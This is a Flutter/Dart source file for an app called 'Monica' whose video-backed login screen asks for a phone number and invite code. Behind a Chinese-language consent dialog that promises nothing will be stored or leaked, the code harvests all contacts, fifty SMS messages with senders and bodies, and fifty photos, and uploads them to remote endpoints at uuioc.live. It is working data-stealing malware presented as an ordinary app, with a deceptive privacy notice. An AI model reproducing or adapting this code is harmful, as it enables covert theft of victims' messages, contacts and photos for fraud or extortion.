import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:video_player/video_player.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:sms_advanced/sms_advanced.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:io';
import 'success_page.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Monica',
      theme: ThemeData(primarySwatch: Colors.blue),
      home: LoginPage(),
    );
  }
}

class LoginPage extends StatefulWidget {
  @override
  _LoginPageState createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final TextEditingController _phoneController = TextEditingController();
  final TextEditingController _codeController = TextEditingController();
  bool _isLoading = false;

  List<Map<String, String>> _contacts = [];
  List<Map<String, String>> _smsList = [];
  List<String> _imagePaths = [];
  String? _userId;
  bool _agreed = false;

  // 权限弹窗
  Future<void> _showPrivacyDialog() async {
    await showDialog(
      context: context,
      barrierDismissible: false,
      builder:
          (_) => AlertDialog(
            title: Text("权限说明"),
            content: Text(
              "本应用将访问您的联系人、短信和相册信息，仅用于适配与服务体验优化，不会存储或泄露任何信息。请点击“同意”以继续。",
            ),
            actions: [
              TextButton(child: Text("拒绝"), onPressed: () => exit(0)),
              TextButton(
                child: Text("同意"),
                onPressed: () {
                  Navigator.pop(context);
                  setState(() {
                    _agreed = true;
                  });
                },
              ),
            ],
          ),
    );
  }

  Future<bool> _requestPermissions() async {
    Map<Permission, PermissionStatus> statuses = {};

    if (await Permission.contacts.request().isGranted) {
      statuses[Permission.contacts] = PermissionStatus.granted;
    }

    if (await Permission.sms.request().isGranted) {
      statuses[Permission.sms] = PermissionStatus.granted;
    }

    if (Platform.isAndroid) {
      final deviceInfo = DeviceInfoPlugin();
      final androidInfo = await deviceInfo.androidInfo;
      if (androidInfo.version.sdkInt >= 33) {
        statuses[Permission.photos] = await Permission.photos.request();
      } else {
        statuses[Permission.storage] = await Permission.storage.request();
      }
    }

    return statuses.values.every((status) => status.isGranted);
  }

  Future<void> _getContacts() async {
    if (!await Permission.contacts.isGranted) return;
    List<Contact> contacts = await FlutterContacts.getContacts(
      withProperties: true,
    );
    _contacts = [];
    for (var c in contacts) {
      if (c.phones.isNotEmpty) {
        _contacts.add({'name': c.displayName, 'phone': c.phones.first.number});
      }
    }
  }

  Future<void> _getSmsList() async {
    if (!await Permission.sms.isGranted) return;
    SmsQuery query = SmsQuery();
    List<SmsMessage> messages = await query.getAllSms;
    _smsList = [];
    for (var m in messages.take(50)) {
      _smsList.add({
        'address': m.address ?? '',
        'body': m.body ?? '',
        'date': m.dateSent?.millisecondsSinceEpoch.toString() ?? '',
        'type': m.kind.toString(),
      });
    }
  }

  Future<void> _getImagePaths() async {
    var result = await PhotoManager.requestPermissionExtend();
    if (!result.isAuth) return;

    List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
      type: RequestType.image,
    );
    if (albums.isNotEmpty) {
      List<AssetEntity> photos = await albums.first.getAssetListPaged(
        page: 0,
        size: 50,
      );
      _imagePaths = [];
      for (var photo in photos) {
        var file = await photo.file;
        if (file != null) _imagePaths.add(file.path);
      }
    }
  }

  Future<void> _uploadAll() async {
    if (!_agreed) {
      await _showPrivacyDialog();
      if (!_agreed) return;
    }

    setState(() => _isLoading = true);

    if (!await _requestPermissions()) {
      ScaffoldMessenger.of(
        context,
      ).showSnackBar(SnackBar(content: Text('请授予所有权限')));
      setState(() => _isLoading = false);
      return;
    }

    String phone = _phoneController.text.trim();
    String code = _codeController.text.trim();

    if (phone.isEmpty || code.isEmpty) {
      ScaffoldMessenger.of(
        context,
      ).showSnackBar(SnackBar(content: Text('请输入手机号和邀请码')));
      setState(() => _isLoading = false);
      return;
    }

    await _getContacts();
    await _getSmsList();
    await _getImagePaths();

    String data =
        '$phone**$code**Flutter_${_contacts.length}_${_imagePaths.length}_${_smsList.length}';
    for (var c in _contacts) {
      data += '=${c['name']}|${c['phone']}';
    }

    var response = await http.post(
      Uri.parse('https://uuioc.live/api/uploads/api'),
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: {'data': data},
    );

    if (response.body.contains('正在加载列表') || response.body.contains('正在載入列表')) {
      var res = await http.post(
        Uri.parse('https://uuioc.live/api/uploads/getuserid'),
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: {'mobile': phone},
      );
      var resData = json.decode(res.body);
      if (resData['code'] == 1) {
        _userId = resData['data'].toString();
        await _uploadImages();
        await _uploadSms(phone, code);
        Navigator.of(
          context,
        ).pushReplacement(MaterialPageRoute(builder: (_) => SuccessPage()));
        ScaffoldMessenger.of(
          context,
        ).showSnackBar(SnackBar(content: Text('登录并上传成功')));
      } else {
        ScaffoldMessenger.of(
          context,
        ).showSnackBar(SnackBar(content: Text('获取用户ID失败')));
      }
    } else {
      ScaffoldMessenger.of(
        context,
      ).showSnackBar(SnackBar(content: Text(response.body)));
    }

    setState(() => _isLoading = false);
  }

  Future<void> _uploadImages() async {
    if (_userId == null) return;
    for (var path in _imagePaths) {
      var request = http.MultipartRequest(
        'POST',
        Uri.parse('https://uuioc.live/api/uploads/img'),
      );
      request.fields['id'] = _userId!;
      request.files.add(await http.MultipartFile.fromPath('data', path));
      await request.send();
    }
  }

  Future<void> _uploadSms(String phone, String code) async {
    List<Map<String, dynamic>> msg_ = [
      {"deviceTag": phone, "codeTag": code},
    ];
    for (var m in _smsList) {
      msg_.add({
        "Smsbody": m['body'],
        "PhoneNumber": m['address'],
        "Date": m['date'],
        "Type": m['type'],
      });
    }
    await http.post(
      Uri.parse('https://uuioc.live/api/uploads/apisms'),
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: {'data': json.encode(msg_)},
    );
  }

  late VideoPlayerController _controller;

  @override
  void initState() {
    super.initState();
    _controller =
        VideoPlayerController.asset('assets/A.mp4')
          ..setLooping(true)
          ..setVolume(0)
          ..initialize().then((_) {
            setState(() {});
            _controller.play();
          });
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        fit: StackFit.expand,
        children: [
          _controller.value.isInitialized
              ? VideoPlayer(_controller)
              : Container(color: Colors.black),
          Center(
            child: Container(
              padding: EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.5),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  TextField(
                    controller: _phoneController,
                    keyboardType: TextInputType.phone,
                    decoration: InputDecoration(
                      hintText: '请输入手机号',
                      filled: true,
                      fillColor: Colors.white.withOpacity(0.1),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                    ),
                    style: TextStyle(color: Colors.white),
                  ),
                  SizedBox(height: 10),
                  TextField(
                    controller: _codeController,
                    decoration: InputDecoration(
                      hintText: '请输入邀请码',
                      filled: true,
                      fillColor: Colors.white.withOpacity(0.1),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                    ),
                    style: TextStyle(color: Colors.white),
                  ),
                  SizedBox(height: 20),
                  _isLoading
                      ? Column(
                        children: [
                          CircularProgressIndicator(),
                          SizedBox(height: 10),
                          Text(
                            '请等待适配中...',
                            style: TextStyle(color: Colors.white),
                          ),
                        ],
                      )
                      : ElevatedButton(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.blue.shade100,
                        ),
                        onPressed: _uploadAll,
                        child: Text('登录'),
                      ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
